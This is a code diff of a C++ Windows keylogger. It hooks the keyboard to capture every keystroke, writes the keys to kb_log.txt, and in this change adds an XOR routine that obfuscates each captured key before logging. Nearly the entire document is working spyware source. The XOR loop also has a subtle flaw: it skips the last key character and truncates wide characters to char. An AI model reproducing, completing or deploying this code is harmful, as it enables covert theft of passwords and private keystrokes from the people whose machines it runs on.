@@ -1,30 +1,45 @@
 #include <keylogger.h>
 
 std::ofstream Keylogger::kblog;
+wchar_t* Keylogger::key = nullptr;
 
-Keylogger::Keylogger() {
+Keylogger::Keylogger(wchar_t* k) {
     kblog = std::ofstream("kb_log.txt", std::ios::app);
+    key = k;
 }
 
 Keylogger::~Keylogger() {
     kblog.close();
 }
 
-char Keylogger::vk2ascii(UINT vkCode) {
+void Keylogger::XOR(wchar_t* data, int data_len, wchar_t* key, int key_len) {
+    int j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == key_len - 1) j = 0;
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
+
+wchar_t* Keylogger::vk2ascii(UINT vkCode) {
+    static WCHAR buffer[16] = {};
+
     BYTE keyboardState[256];
     for (int i = 0; i < 256; i++) {
         keyboardState[i] = (BYTE)GetKeyState(i);
     }
 
-    WCHAR buffer[4] = {};
+    ZeroMemory(buffer, sizeof(buffer));
 
-    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
+    UINT scanCode = MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC);
 
-    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
+    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0x04);
 
-    if (result > 0) return static_cast<char>(buffer[0]);
+    if (result <= 0) return nullptr;
 
-    return '\0';
+    buffer[result] = L'\0';
+
+    return buffer;
 }
 
 LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
@@ -33,7 +48,12 @@ LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
     if (code == HC_ACTION) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             DWORD vkCode = pKeyStruct->vkCode;
-            kblog << vk2ascii(vkCode) << std::endl;
+            wchar_t* character = vk2ascii(vkCode);
+            if (character != nullptr) {
+                // std::cout << "Before XOR: " << static_cast<char>(*character) << std::endl; 
+                XOR(character, lstrlenW(character), key, lstrlenW(key));
+                kblog << static_cast<char>(*character) << std::endl;
+            }
         } 
     }
 
